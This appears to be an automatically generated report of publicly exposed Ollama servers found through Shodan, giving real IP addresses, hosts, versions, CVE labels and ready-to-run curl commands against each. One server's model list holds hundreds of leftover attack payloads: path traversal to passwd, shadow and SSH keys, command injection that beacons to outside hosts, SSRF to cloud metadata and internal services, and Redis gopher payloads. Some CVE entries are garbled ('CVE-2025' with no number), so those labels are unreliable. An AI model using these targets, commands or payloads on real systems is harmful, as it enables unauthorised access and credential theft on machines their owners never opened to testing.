# 🔍 Ollama Exposed Instances Report
**Generated:** 2026-07-12 14:57 UTC
**Shodan total:** 42 | **Tested:** 42
**Exposed (no auth):** 24 | **Protected:** 8 | **Dead/Timeout:** 10

---
## 🔴 EXPOSED INSTANCES (NO AUTH)

### http://66.240.205.176:11434
- **Hosting:** CARI.net
- **Country:** United States / San Diego
- **Version:** 0.1.46
- **⚠️ VULNERABLE to:** CVE-2024-39722, CVE-2024-39721, CVE-2025
  - CVE-2024-39722: Path Traversal in model manifests — allows reading arbitrary files (CRITICAL)
  - CVE-2024-39721: Unauthorized model upload — allows uploading malicious models (HIGH)
  - CVE-2025: SSRF through custom model imports (HIGH)
- **Generation test:** ✅ PASSED

| Model | Size | Params | Quant |
|-------|------|--------|-------|
| gemma3:8.2b | 4867MB | 8.2B | Q5_K_M |
| deepseek-r1:14b | 8491MB | 14B | Q5_K_M |
| qwen2.5:72b | 36243MB | 72B | Q5_K_M |
| deepseek-r1:latest | 17836MB | 33B | Q8_0 |

#### PoC Commands
```bash
# Check running
curl -sk http://66.240.205.176:11434/

# List models
curl -sk http://66.240.205.176:11434/api/tags

# Generate text (test with gemma3:8.2b)
curl -sk http://66.240.205.176:11434/api/generate \
  -H "Content-Type: application/json" \
  -d '{"model":"gemma3:8.2b","prompt":"test","stream":false}'
```

### http://172.233.44.98:11434
- **Hosting:** Linode
- **Country:** Netherlands / Amsterdam
- **Version:** 0.1.45
- **⚠️ VULNERABLE to:** CVE-2024-39722, CVE-2024-39721, CVE-2025
  - CVE-2024-39722: Path Traversal in model manifests — allows reading arbitrary files (CRITICAL)
  - CVE-2024-39721: Unauthorized model upload — allows uploading malicious models (HIGH)
  - CVE-2025: SSRF through custom model imports (HIGH)
- **Generation test:** ✅ PASSED

| Model | Size | Params | Quant |
|-------|------|--------|-------|
| llama3.1:8b | 3919MB | 7b | Q4_K_M |
| qwen2.5-coder:7b | 4506MB | 7b | Q4_K_M |
| llama2:13b | 7025MB | 13b | Q4_0 |
| llama3:70b | 40297MB | 70b | Q4_K_M |
| gemma4:26b-mlx | 15696MB | 26b | Q4_K_M |
| qwen3.6:27b | 16393MB | 27b | Q4_K_M |
| qwen3.6:35b-mlx | 21514MB | 35b | Q4_K_M |
| llama3.2:1b | 3919MB | 7b | Q4_K_M |
| ../../../../opt/ollama/data/credentials.txt | 3919MB | 7b | Q4_K_M |
| ../../../../opt/ollama/data/.env_backup | 3919MB | 7b | Q4_K_M |
| ../../../../opt/ollama/data/target_recon.json | 3919MB | 7b | Q4_K_M |
| ../../../../opt/ollama/data/db_dump.sql | 3919MB | 7b | Q4_K_M |
| ../../../../opt/ollama/data/run_exploit.sh | 3919MB | 7b | Q4_K_M |
| ../../../../opt/ollama/data/exploits/ssrf_probe.sh | 3919MB | 7b | Q4_K_M |
| leak__etc_passwd | 3919MB | 7b | Q4_K_M |
| leak__etc_hostname | 3919MB | 7b | Q4_K_M |
| ../../../etc/passwd | 3919MB | 7b | Q4_K_M |
| f5leak__etc_shadow | 3919MB | 7b | Q4_K_M |
| f5leak__root_.ssh_id_ed25519 | 3919MB | 7b | Q4_K_M |
| f5leak__root_.ssh_id_rsa | 3919MB | 7b | Q4_K_M |
| f5leak__home_all_.ssh_id_ed25519 | 3919MB | 7b | Q4_K_M |
| f5leak__etc_ssh_ssh_host_ed25519_key | 3919MB | 7b | Q4_K_M |
| f5leak__opt_ollama_data_credentials.t | 3919MB | 7b | Q4_K_M |
| f5leak__opt_ollama_data_.env_backup | 3919MB | 7b | Q4_K_M |
| raw_creds_1782214923913 | 3919MB | 7b | Q4_K_M |
| f5leak__opt_ollama_data_target_recon. | 3919MB | 7b | Q4_K_M |
| raw_env_backup_1782214951627 | 3919MB | 7b | Q4_K_M |
| f5leak__opt_ollama_data_db_dump.sql | 3919MB | 7b | Q4_K_M |
| raw_targets_1782214980064 | 3919MB | 7b | Q4_K_M |
| rawleak__etc_passwd | 3919MB | 7b | Q4_K_M |
| raw_dbdump_1782215007751 | 3919MB | 7b | Q4_K_M |
| rawleak__etc_shadow | 3919MB | 7b | Q4_K_M |
| raw_exploit_1782215034911 | 3919MB | 7b | Q4_K_M |
| raw_ssrf_1782215060783 | 3919MB | 7b | Q4_K_M |
| raw_passwd_1782215087141 | 3919MB | 7b | Q4_K_M |
| raw_shadow_1782215115515 | 3919MB | 7b | Q4_K_M |
| raw_hostname_1782215142666 | 3919MB | 7b | Q4_K_M |
| test;id | 3919MB | 7b | Q4_K_M |
| test$(id) | 3919MB | 7b | Q4_K_M |
| test$(whoami) | 3919MB | 7b | Q4_K_M |
| http://d8tr5qc9f2eh23r8qtg0z7uraxzxxpzgn.oast.online/rogue/3fzzlbmtrpkzuxtakvnbgvbyeza | 3919MB | 7b | Q4_K_M |
| test_model | 3919MB | 7b | Q4_K_M |
| file:///opt/ollama/data/credentials.txt | 3919MB | 7b | Q4_K_M |
| exfil | 3919MB | 7b | Q4_K_M |
| ../../../../etc/passwd | 3919MB | 7b | Q4_K_M |
| ../../../../etc/shadow | 3919MB | 7b | Q4_K_M |
| ../../../../root/.bash_history | 3919MB | 7b | Q4_K_M |
| ../../../../home/*/.ssh/id_rsa | 3919MB | 7b | Q4_K_M |
| ../../../../../../etc/passwd | 3919MB | 7b | Q4_K_M |
| ../../../../../../../etc/passwd | 3919MB | 7b | Q4_K_M |
| ../../../../../../../etc/shadow | 3919MB | 7b | Q4_K_M |
| ../../../../../../../root/.ssh/id_rsa | 3919MB | 7b | Q4_K_M |
| ../../../../../../../root/.ssh/authorized_keys | 3919MB | 7b | Q4_K_M |
| ../../../../root/.ssh/id_rsa | 3919MB | 7b | Q4_K_M |
| read__proc_self_environ | 3919MB | 7b | Q4_K_M |
| test;curl -s http://ifconfig.me;id | 3919MB | 7b | Q4_K_M |
| " | 3919MB | 7b | Q4_K_M |
| test_read1 | 3919MB | 7b | Q4_K_M |
| test_read2 | 3919MB | 7b | Q4_K_M |
| test | 3919MB | 7b | Q4_K_M |
| http://127.0.0.1:8080/test | 3919MB | 7b | Q4_K_M |
| fileread_test | 3919MB | 7b | Q4_K_M |
| readfile1 | 3919MB | 7b | Q4_K_M |
| r1 | 3919MB | 7b | Q4_K_M |
| r2 | 3919MB | 7b | Q4_K_M |
| r3 | 3919MB | 7b | Q4_K_M |
| read__root__ssh_id_rsa | 3919MB | 7b | Q4_K_M |
| x__etc_passwd | 3919MB | 7b | Q4_K_M |
| x__etc_hostname | 3919MB | 7b | Q4_K_M |
| x__root_.ssh_id_rsa | 3919MB | 7b | Q4_K_M |
| ../../../../tmp/testpull | 3919MB | 7b | Q4_K_M |
| 192.168.1.1:8888/test/model | 3919MB | 7b | Q4_K_M |
| testzip | 3919MB | 7b | Q4_K_M |
| routetest | 3919MB | 7b | Q4_K_M |
| 8eeb-118-136-159-164.ngrok-free.app/rogue/exploit | 3919MB | 7b | Q4_K_M |
| 87c5-118-136-159-164.ngrok-free.app/rogue/exploit | 3919MB | 7b | Q4_K_M |
| 87c5-118-136-159-164.ngrok-free.app/zipx1782662000/exploit | 3919MB | 7b | Q4_K_M |
| 87c5-118-136-159-164.ngrok-free.app/debugtest123/exploit | 3919MB | 7b | Q4_K_M |
| 87c5-118-136-159-164.ngrok-free.app/test1782662103/exploit | 3919MB | 7b | Q4_K_M |
| 87c5-118-136-159-164.ngrok-free.app/z2662211/exploit | 3919MB | 7b | Q4_K_M |
| blobtest | 3919MB | 7b | Q4_K_M |
| blobtest2 | 3919MB | 7b | Q4_K_M |
| blobtest3 | 3919MB | 7b | Q4_K_M |
| digesttest | 3919MB | 7b | Q4_K_M |
| nonexistent-registry.example.com:9999/test/test | 3919MB | 7b | Q4_K_M |
| ziptest_a | 3919MB | 7b | Q4_K_M |
| ziptest_b | 3919MB | 7b | Q4_K_M |
| ziptest_c | 3919MB | 7b | Q4_K_M |
| 87c5-118-136-159-164.ngrok-free.app/v700583/exploit | 3919MB | 7b | Q4_K_M |
| a0fa-182-253-127-165.ngrok-free.app/z700696/exploit | 3919MB | 7b | Q4_K_M |
| pulldigesttest | 3919MB | 7b | Q4_K_M |
| empty_local | 3919MB | 7b | Q4_K_M |
| template_only | 3919MB | 7b | Q4_K_M |
| nonexistent_abc123xyz | 3919MB | 7b | Q4_K_M |
| 87c5-118-136-159-164.ngrok-free.app/testinsec/exploit | 3919MB | 7b | Q4_K_M |
| 87c5-118-136-159-164.ngrok-free.app/testinsec2/exploit | 3919MB | 7b | Q4_K_M |
| this-registry-definitely-doesnt-exist-xyzzy.com/library/test | 3919MB | 7b | Q4_K_M |
| ollama.anomaly.software/test123/model | 3919MB | 7b | Q4_K_M |
| hydrateam/hydrav1 | 3919MB | 7b | Q4_K_M |
| huihui_ai/qwen3.5-abliterated:2b | 3919MB | 7b | Q4_K_M |
| tinyllama:latest | 3919MB | 7b | Q4_K_M |
| hacked_by_pentest | 3919MB | 7b | Q4_K_M |
| rce_test_pentest | 3919MB | 7b | Q4_K_M |
| env_leak | 3919MB | 7b | Q4_K_M |
| cfg_leak | 3919MB | 7b | Q4_K_M |
| ssh_inject | 3919MB | 7b | Q4_K_M |
| ssh_key_leak | 3919MB | 7b | Q4_K_M |
| leak_c77709b307e332dffc76ba89637bcf25 | 3919MB | 7b | Q4_K_M |
| leak_72d687161e8255cb2cbc5982993c2757 | 3919MB | 7b | Q4_K_M |
| leak_4d46f8b5f3665f77d94620adb5e0900d | 3919MB | 7b | Q4_K_M |
| leak_b14e86e8b3f43f5754a2652124475100 | 3919MB | 7b | Q4_K_M |
| leak_507a20c6e5704407b13c91e95005d6dd | 3919MB | 7b | Q4_K_M |
| leak_1cf04e4dc2ce0a6f0a09787072d8071e | 3919MB | 7b | Q4_K_M |
| leak_22fc5567a1d0bdcbf2d156ba2c2d7f60 | 3919MB | 7b | Q4_K_M |
| leak_5123a704fb1a9c1c63c2f945085238b6 | 3919MB | 7b | Q4_K_M |
| leak_kh_1782723306 | 3919MB | 7b | Q4_K_M |
| leak_bh_1782723316 | 3919MB | 7b | Q4_K_M |
| environ_1782723387 | 3919MB | 7b | Q4_K_M |
| cfg_1782723402 | 3919MB | 7b | Q4_K_M |
| rce_registry_test | 3919MB | 7b | Q4_K_M |
| ak_1782723496 | 3919MB | 7b | Q4_K_M |
| leak_5976111503904111693 | 3919MB | 7b | Q4_K_M |
| leak_2242294216482835741 | 3919MB | 7b | Q4_K_M |
| leak_3804937153866202468 | 3919MB | 7b | Q4_K_M |
| leak_7073818958363006286 | 3919MB | 7b | Q4_K_M |
| 23.254.233.159:8088/rogue/exploit | 3919MB | 7b | Q4_K_M |
| buf_overflow_test | 3919MB | 7b | Q4_K_M |
| inj_1782726222831223000 | 3919MB | 7b | Q4_K_M |
| inj_1782726232860888000 | 3919MB | 7b | Q4_K_M |
| inj_1782726242882117000 | 3919MB | 7b | Q4_K_M |
| proc_self_maps | 3919MB | 7b | Q4_K_M |
| proc_self_cmd | 3919MB | 7b | Q4_K_M |
| ollama_key_e433dc00 | 3919MB | 7b | Q4_K_M |
| ollama_key_494b7c2c | 3919MB | 7b | Q4_K_M |
| ollama_key_a25f5ea8 | 3919MB | 7b | Q4_K_M |
| pubkey_test | 3919MB | 7b | Q4_K_M |
| ../../opt/ollama/data/credentials.txt | 3919MB | 7b | Q4_K_M |
| hydrateam/hydrab22 | 3919MB | 7b | Q4_K_M |
| ../../../../../../root/.ssh/id_rsa | 3919MB | 7b | Q4_K_M |
| ../../../../../../etc/shadow | 3919MB | 7b | Q4_K_M |
| ../../credentials.txt | 3919MB | 7b | Q4_K_M |
| ../../.env | 3919MB | 7b | Q4_K_M |
| glm-5.2:cloud | 3919MB | 7b | Q4_K_M |
| hydrateam/hydrab23 | 3919MB | 7b | Q4_K_M |
| readtest1 | 3919MB | 7b | Q4_K_M |
| rcetest | 3919MB | 7b | Q4_K_M |
| ../../../../etc/hostname | 3919MB | 7b | Q4_K_M |
| read_hostname_test | 3919MB | 7b | Q4_K_M |
| test_rce2 | 3919MB | 7b | Q4_K_M |
| rce_probe | 3919MB | 7b | Q4_K_M |
| ssrf_test | 3919MB | 7b | Q4_K_M |
| 127.0.0.1:22/test/model | 3919MB | 7b | Q4_K_M |
| 127.0.0.1:80/test/model | 3919MB | 7b | Q4_K_M |
| 127.0.0.1:443/test/model | 3919MB | 7b | Q4_K_M |
| 127.0.0.1:3000/test/model | 3919MB | 7b | Q4_K_M |
| 127.0.0.1:5000/test/model | 3919MB | 7b | Q4_K_M |
| 127.0.0.1:8000/test/model | 3919MB | 7b | Q4_K_M |
| 127.0.0.1:8080/test/model | 3919MB | 7b | Q4_K_M |
| 127.0.0.1:8443/test/model | 3919MB | 7b | Q4_K_M |
| 127.0.0.1:9000/test/model | 3919MB | 7b | Q4_K_M |
| 127.0.0.1:9200/test/model | 3919MB | 7b | Q4_K_M |
| rce_exploit | 3919MB | 7b | Q4_K_M |
| ../../../tmp/pwned | 3919MB | 7b | Q4_K_M |
| test; curl http://172.233.44.98:11434/ | head -5 | 3919MB | 7b | Q4_K_M |
| ../../../../root/.ssh/authorized_keys2 | 3919MB | 7b | Q4_K_M |
| http://localhost:6379/test | 3919MB | 7b | Q4_K_M |
| http://localhost:9200/ | 3919MB | 7b | Q4_K_M |
| ../etc/passwd | 3919MB | 7b | Q4_K_M |
| localhost:6379/ollama/test | 3919MB | 7b | Q4_K_M |
| 127.0.0.1:3306/test | 3919MB | 7b | Q4_K_M |
| 127.0.0.1:9200/test | 3919MB | 7b | Q4_K_M |
| 127.0.0.1:5000/test | 3919MB | 7b | Q4_K_M |
| gopher://localhost:6379/_set%20test%20sshkey | 3919MB | 7b | Q4_K_M |
| http://192.168.50.10:8888/payload | 3919MB | 7b | Q4_K_M |
| environ_test | 3919MB | 7b | Q4_K_M |
| rce_test_read | 3919MB | 7b | Q4_K_M |
| es_test | 3919MB | 7b | Q4_K_M |
| es_indices | 3919MB | 7b | Q4_K_M |
| svc_5000 | 3919MB | 7b | Q4_K_M |
| leer_passwd_173 | 3919MB | 7b | Q4_K_M |
| escribir_test | 3919MB | 7b | Q4_K_M |
| read_f1 | 3919MB | 7b | Q4_K_M |
| read_f2 | 3919MB | 7b | Q4_K_M |
| leer_shadow | 3919MB | 7b | Q4_K_M |
| http://169.254.169.254/latest/meta-data | 3919MB | 7b | Q4_K_M |
| http://169.254.169.253/latest/meta-data | 3919MB | 7b | Q4_K_M |
| http://100.100.100.200/latest/meta-data | 3919MB | 7b | Q4_K_M |
| metadata_test | 3919MB | 7b | Q4_K_M |
| $(cat /etc/passwd | head -5 2>&1) | 3919MB | 7b | Q4_K_M |
| $(id > /tmp/pwned_173 2>&1) | 3919MB | 7b | Q4_K_M |
| leer_tmp_pwned | 3919MB | 7b | Q4_K_M |
| test_write_check | 3919MB | 7b | Q4_K_M |
| mykey | 3919MB | 7b | Q4_K_M |
| check_auth_keys | 3919MB | 7b | Q4_K_M |
| ssh_deploy | 3919MB | 7b | Q4_K_M |
| leer_hostname | 3919MB | 7b | Q4_K_M |
| http://127.0.0.1:22/ | 3919MB | 7b | Q4_K_M |
| http://127.0.0.1:80/ | 3919MB | 7b | Q4_K_M |
| http://127.0.0.1:443/ | 3919MB | 7b | Q4_K_M |
| http://127.0.0.1:3000/ | 3919MB | 7b | Q4_K_M |
| http://127.0.0.1:5000/ | 3919MB | 7b | Q4_K_M |
| http://127.0.0.1:6379/ | 3919MB | 7b | Q4_K_M |
| http://127.0.0.1:8000/ | 3919MB | 7b | Q4_K_M |
| http://127.0.0.1:8080/ | 3919MB | 7b | Q4_K_M |
| http://127.0.0.1:8443/ | 3919MB | 7b | Q4_K_M |
| http://127.0.0.1:9000/ | 3919MB | 7b | Q4_K_M |
| http://127.0.0.1:9200/ | 3919MB | 7b | Q4_K_M |
| http://127.0.0.1:27017/ | 3919MB | 7b | Q4_K_M |
| file:///etc/passwd | 3919MB | 7b | Q4_K_M |
| file:///root/.ssh/id_rsa | 3919MB | 7b | Q4_K_M |
| /etc/passwd | 3919MB | 7b | Q4_K_M |
| gopher://127.0.0.1:6379/_ping | 3919MB | 7b | Q4_K_M |
| crlf_test | 3919MB | 7b | Q4_K_M |
| http://127.0.0.1:80/test | 3919MB | 7b | Q4_K_M |
| test | 3919MB | 7b | Q4_K_M |
| ssrf_advanced | 3919MB | 7b | Q4_K_M |
| http://127.0.0.1:3000/test | 3919MB | 7b | Q4_K_M |
| http://127.0.0.1:5000/test | 3919MB | 7b | Q4_K_M |
| linode_meta | 3919MB | 7b | Q4_K_M |
| http://127.0.0.1:8000/test | 3919MB | 7b | Q4_K_M |
| http://127.0.0.1:8443/test | 3919MB | 7b | Q4_K_M |
| http://127.0.0.1:9090/test | 3919MB | 7b | Q4_K_M |
| http://169.254.169.254/latest/meta-data/ | 3919MB | 7b | Q4_K_M |
| http://169.254.169.254/latest/meta-data/iam/security-credentials/ | 3919MB | 7b | Q4_K_M |
| http://metadata.google.internal/computemetadata/v1/ | 3919MB | 7b | Q4_K_M |
| http://100.100.100.200/latest/meta-data/ | 3919MB | 7b | Q4_K_M |
| http://ifconfig.me | 3919MB | 7b | Q4_K_M |
| http://127.0.0.1:11434/api/tags | 3919MB | 7b | Q4_K_M |
| http://127.0.0.1:99999/ | 3919MB | 7b | Q4_K_M |
| pwn | 3919MB | 7b | Q4_K_M |
| test_tmp | 3919MB | 7b | Q4_K_M |
| ../../../tmp/ollama_pwn_test | 3919MB | 7b | Q4_K_M |
| leer_pwn_test | 3919MB | 7b | Q4_K_M |
| leer_creds_real | 3919MB | 7b | Q4_K_M |
| https://webhook.site/880822a0-3315-47b2-913e-5a8fcd7e54dd?event=ssrf_test | 3919MB | 7b | Q4_K_M |
| cve_test | 3919MB | 7b | Q4_K_M |
| ../../../../etc/cron.d/ollama_pwn | 3919MB | 7b | Q4_K_M |
| http://httpbin.org/get | 3919MB | 7b | Q4_K_M |
| http://postman-echo.com/get | 3919MB | 7b | Q4_K_M |
| http://webhook.site/880822a0-3315-47b2-913e-5a8fcd7e54dd | 3919MB | 7b | Q4_K_M |
| ssrf_test_wh | 3919MB | 7b | Q4_K_M |
| ssrf_test_hb | 3919MB | 7b | Q4_K_M |
| ssrf_test_https | 3919MB | 7b | Q4_K_M |
| test; curl -s http://webhook.site/880822a0-3315-47b2-913e-5a8fcd7e54dd?cmd=test; echo done | 3919MB | 7b | Q4_K_M |
| test; curl http://webhook.site/880822a0-3315-47b2-913e-5a8fcd7e54dd?from=pull; echo | 3919MB | 7b | Q4_K_M |
| rce_test_system | 3919MB | 7b | Q4_K_M |
| leer_bash_hist | 3919MB | 7b | Q4_K_M |
| check_authkeys2 | 3919MB | 7b | Q4_K_M |
| auth_brute | 3919MB | 7b | Q4_K_M |
| from_auth | 3919MB | 7b | Q4_K_M |
| check_passwd2 | 3919MB | 7b | Q4_K_M |
| docker.io/library/ubuntu:latest | 3919MB | 7b | Q4_K_M |
| rce_test_final | 3919MB | 7b | Q4_K_M |
| ssh_key_model | 3919MB | 7b | Q4_K_M |
| etc_passwd_check2 | 3919MB | 7b | Q4_K_M |
| 138.199.52.195/vsociety/test | 3919MB | 7b | Q4_K_M |
| 138.199.52.195/vsociety/test2 | 3919MB | 7b | Q4_K_M |
| 138.199.52.195:8888/vsociety/test | 3919MB | 7b | Q4_K_M |
| conn_test | 3919MB | 7b | Q4_K_M |
| http://127.0.0.1:9999/minio/admin/v3/list | 3919MB | 7b | Q4_K_M |
| minio_config | 3919MB | 7b | Q4_K_M |
| minio_env | 3919MB | 7b | Q4_K_M |
| minio_service | 3919MB | 7b | Q4_K_M |
| 138.199.52.195:8888/pwn_f2d639c6/exploit | 3919MB | 7b | Q4_K_M |
| http://127.0.0.1:9999/minio/admin/v3/list/buckets | 3919MB | 7b | Q4_K_M |
| http://127.0.0.1:9999/ | 3919MB | 7b | Q4_K_M |
| http://127.0.0.1:9999/minio/health/live | 3919MB | 7b | Q4_K_M |
| minio_test | 3919MB | 7b | Q4_K_M |
| 138.199.52.195:80/conn_test/test_1782968744 | 3919MB | 7b | Q4_K_M |
| read_minio_svc | 3919MB | 7b | Q4_K_M |
| read_minio_default | 3919MB | 7b | Q4_K_M |
| read_minio_config | 3919MB | 7b | Q4_K_M |
| read_minio_creds | 3919MB | 7b | Q4_K_M |
| 138.199.52.195:8888/conn_test/test_1782968825 | 3919MB | 7b | Q4_K_M |
| read_ollama_env | 3919MB | 7b | Q4_K_M |
| gratified-armed-sizzle.ngrok-free.dev/exploit_test/test1 | 3919MB | 7b | Q4_K_M |
| read_ollama_creds | 3919MB | 7b | Q4_K_M |
| test_small_file | 3919MB | 7b | Q4_K_M |
| gratified-armed-sizzle.ngrok-free.dev/https_test/model1 | 3919MB | 7b | Q4_K_M |
| pwn_test_read | 3919MB | 7b | Q4_K_M |
| pwn_read2 | 3919MB | 7b | Q4_K_M |
| http://127.0.0.1:3306/ | 3919MB | 7b | Q4_K_M |
| pwn_traverse | 3919MB | 7b | Q4_K_M |
| http://127.0.0.1:5432/ | 3919MB | 7b | Q4_K_M |
| pwn_modelfile | 3919MB | 7b | Q4_K_M |
| gopher://127.0.0.1:6379/_config%20set%20dir%20/root/.ssh | 3919MB | 7b | Q4_K_M |
| read_ollama_log | 3919MB | 7b | Q4_K_M |
| read_syslog | 3919MB | 7b | Q4_K_M |
| ssrf_scan | 3919MB | 7b | Q4_K_M |
| fileread_test2 | 3919MB | 7b | Q4_K_M |
| test_`id > /tmp/pwned_ck` | 3919MB | 7b | Q4_K_M |
| test_$(curl http://138.199.52.195:8888/pwned) | 3919MB | 7b | Q4_K_M |
| test:latest | 3919MB | 7b | Q4_K_M |
| p | 3919MB | 7b | Q4_K_M |
| k | 3919MB | 7b | Q4_K_M |
| s | 3919MB | 7b | Q4_K_M |
| ssh | 3919MB | 7b | Q4_K_M |
| e | 3919MB | 7b | Q4_K_M |
| http://metadata.google.internal/ | 3919MB | 7b | Q4_K_M |
| http://127.0.0.1:22 | 3919MB | 7b | Q4_K_M |
| http://d93ruj7aute9sbdkpr605jebapanswhqa.oast.fun/rogue/3fznmbgxyd9pplrtlcxzt9lq9i4 | 3919MB | 7b | Q4_K_M |
| envreader | 3919MB | 7b | Q4_K_M |
| read__etc_passwd | 3919MB | 7b | Q4_K_M |
| read__root_.aws_credentials | 3919MB | 7b | Q4_K_M |
| read__opt_ollama_data_.env | 3919MB | 7b | Q4_K_M |
| llama3:8b | 3919MB | 7b | Q4_K_M |
| http://169.254.169.254/metadata/instance | 3919MB | 7b | Q4_K_M |
| leak_test_440 | 3919MB | 7b | Q4_K_M |
| leak_test_5648 | 3919MB | 7b | Q4_K_M |
| leak_test_1592 | 3919MB | 7b | Q4_K_M |
| leak_test_4672 | 3919MB | 7b | Q4_K_M |
| leak_test_989 | 3919MB | 7b | Q4_K_M |
| leak_test_3940 | 3919MB | 7b | Q4_K_M |
| from_test_440 | 3919MB | 7b | Q4_K_M |
| from_test_1592 | 3919MB | 7b | Q4_K_M |
| from_test_4672 | 3919MB | 7b | Q4_K_M |
| http://169.254.169.254/metadata/instance?api-version=2021-02-01 | 3919MB | 7b | Q4_K_M |
| http://metadata.google.internal/computemetadata/v1/instance/service-accounts/default/token | 3919MB | 7b | Q4_K_M |
| test_fileread | 3919MB | 7b | Q4_K_M |
| test_env | 3919MB | 7b | Q4_K_M |
| test_ssh | 3919MB | 7b | Q4_K_M |
| test_aws | 3919MB | 7b | Q4_K_M |
| http://169.254.169.254/latest/user-data | 3919MB | 7b | Q4_K_M |
| http://host.docker.internal:2375/info | 3919MB | 7b | Q4_K_M |
| http://localhost:8888/api/status | 3919MB | 7b | Q4_K_M |
| http://localhost:6379/info | 3919MB | 7b | Q4_K_M |
| http://localhost:5432/ | 3919MB | 7b | Q4_K_M |
| https://kubernetes.default.svc/api/v1/namespaces | 3919MB | 7b | Q4_K_M |
| http://localhost:2379/v2/keys/ | 3919MB | 7b | Q4_K_M |
| adapter_test_13296 | 3919MB | 7b | Q4_K_M |
| adapter_test_3225 | 3919MB | 7b | Q4_K_M |
| adapter_test_15306 | 3919MB | 7b | Q4_K_M |
| adapter_test_28845 | 3919MB | 7b | Q4_K_M |
| adapter_test_95954 | 3919MB | 7b | Q4_K_M |
| adapter_test_88678 | 3919MB | 7b | Q4_K_M |
| adapter_test_98741 | 3919MB | 7b | Q4_K_M |
| adapter_test_42198 | 3919MB | 7b | Q4_K_M |
| adapter_test_49675 | 3919MB | 7b | Q4_K_M |
| adapter_test_34410 | 3919MB | 7b | Q4_K_M |
| adapter_test_68776 | 3919MB | 7b | Q4_K_M |
| adapter_test_61961 | 3919MB | 7b | Q4_K_M |
| adapter_test_54279 | 3919MB | 7b | Q4_K_M |
| adapter_test_86557 | 3919MB | 7b | Q4_K_M |
| adapter_test_41942 | 3919MB | 7b | Q4_K_M |
| adapter_test_67427 | 3919MB | 7b | Q4_K_M |
| tpl_dump_all_context | 3919MB | 7b | Q4_K_M |
| adapter_test_86323 | 3919MB | 7b | Q4_K_M |
| tpl_dump_env | 3919MB | 7b | Q4_K_M |
| tpl_standard_fields | 3919MB | 7b | Q4_K_M |
| tpl_call_tools | 3919MB | 7b | Q4_K_M |
| tpl_type_inspection | 3919MB | 7b | Q4_K_M |
| blob_test | 3919MB | 7b | Q4_K_M |
| gpu_worker | 3919MB | 7b | Q4_K_M |
| botnet_node | 3919MB | 7b | Q4_K_M |
| tinyllama:1b | 3919MB | 7b | Q4_K_M |
| eni-test | 3919MB | 7b | Q4_K_M |
| eni-lfi | 3919MB | 7b | Q4_K_M |
| ../../../../../../root/.ssh/authorized_keys | 3919MB | 7b | Q4_K_M |
| exfil_9231fb35 | 3919MB | 7b | Q4_K_M |
| exfil_15b9d616 | 3919MB | 7b | Q4_K_M |
| http://localhost:22/ | 3919MB | 7b | Q4_K_M |
| http://localhost:80/ | 3919MB | 7b | Q4_K_M |
| http://localhost:443/ | 3919MB | 7b | Q4_K_M |
| http://localhost:3000/ | 3919MB | 7b | Q4_K_M |
| http://localhost:8080/ | 3919MB | 7b | Q4_K_M |
| http://1.1.1.1/ | 3919MB | 7b | Q4_K_M |
| ssti_a2f25e | 3919MB | 7b | Q4_K_M |
| ssti_e56324 | 3919MB | 7b | Q4_K_M |
| probe_f70f09 | 3919MB | 7b | Q4_K_M |
| probe_9270f0 | 3919MB | 7b | Q4_K_M |
| probe_501836 | 3919MB | 7b | Q4_K_M |
| probe_097306 | 3919MB | 7b | Q4_K_M |
| p_dea334 | 3919MB | 7b | Q4_K_M |
| p_e53551 | 3919MB | 7b | Q4_K_M |
| p_aa633f | 3919MB | 7b | Q4_K_M |
| p_396cbb | 3919MB | 7b | Q4_K_M |
| p_6230af | 3919MB | 7b | Q4_K_M |
| http://localhost:2375/ | 3919MB | 7b | Q4_K_M |
| http://localhost:2376/ | 3919MB | 7b | Q4_K_M |
| http://localhost:8000/ | 3919MB | 7b | Q4_K_M |
| dkr_0ad9 | 3919MB | 7b | Q4_K_M |
| dkr_57af | 3919MB | 7b | Q4_K_M |
| dkr_efd7 | 3919MB | 7b | Q4_K_M |
| dkr_6e6c | 3919MB | 7b | Q4_K_M |
| test;id>/tmp/pwned | 3919MB | 7b | Q4_K_M |
| test;curl http://114.10.39.70:11443/beacon?cmd=$(id) | 3919MB | 7b | Q4_K_M |
| readpasswd | 3919MB | 7b | Q4_K_M |
| readetc | 3919MB | 7b | Q4_K_M |
| readfile | 3919MB | 7b | Q4_K_M |
| `id > /tmp/pwned_backtick` | 3919MB | 7b | Q4_K_M |
| $(id > /tmp/pwned_dollar) | 3919MB | 7b | Q4_K_M |
| test;id>/tmp/pwned_semi | 3919MB | 7b | Q4_K_M |
| test|id>/tmp/pwned_pipe | 3919MB | 7b | Q4_K_M |
| test | 3919MB | 7b | Q4_K_M |
| leak__root_.ssh_id_ed25519 | 3919MB | 7b | Q4_K_M |

#### PoC Commands
```bash
# Check running
curl -sk http://172.233.44.98:11434/

# List models
curl -sk http://172.233.44.98:11434/api/tags

# Generate text (test with llama3.1:8b)
curl -sk http://172.233.44.98:11434/api/generate \
  -H "Content-Type: application/json" \
  -d '{"model":"llama3.1:8b","prompt":"test","stream":false}'
```

### http://103.112.163.92:11434
- **Hosting:** PT Cloud Teknologi Nusantara
- **Country:** Indonesia / Jakarta
- **Version:** 0.5.7
- **Generation test:** ✅ PASSED

| Model | Size | Params | Quant |
|-------|------|--------|-------|
| llama3.1:latest | 4445MB | 8.0B | Q4_0 |
| mistral:latest | 3923MB | 7.2B | Q4_0 |
| codellama:13b | 7025MB | 13B | Q4_0 |
| phi3:latest | 2282MB | 3.8B | Q4_K_M |
| nomic-embed-text:latest | 262MB | 137M | F16 |

#### PoC Commands
```bash
# Check running
curl -sk http://103.112.163.92:11434/

# List models
curl -sk http://103.112.163.92:11434/api/tags

# Generate text (test with llama3.1:latest)
curl -sk http://103.112.163.92:11434/api/generate \
  -H "Content-Type: application/json" \
  -d '{"model":"llama3.1:latest","prompt":"test","stream":false}'
```

### http://45.150.108.219:11434
- **Hosting:** BlueVPS OU
- **Country:** Israel / Tel Aviv
- **Version:** 0.1.46
- **⚠️ VULNERABLE to:** CVE-2024-39722, CVE-2024-39721, CVE-2025
  - CVE-2024-39722: Path Traversal in model manifests — allows reading arbitrary files (CRITICAL)
  - CVE-2024-39721: Unauthorized model upload — allows uploading malicious models (HIGH)
  - CVE-2025: SSRF through custom model imports (HIGH)
- **Generation test:** ✅ PASSED

| Model | Size | Params | Quant |
|-------|------|--------|-------|
| deepseek-r1:14b | 8492MB | 14B | Q8_0 |
| deepseek-r1:latest | 17836MB | 33B | Q5_K_M |
| qwen2.5:72b | 36244MB | 72B | Q5_K_M |
| gemma3:8.2b | 4864MB | 8.2B | F16 |

#### PoC Commands
```bash
# Check running
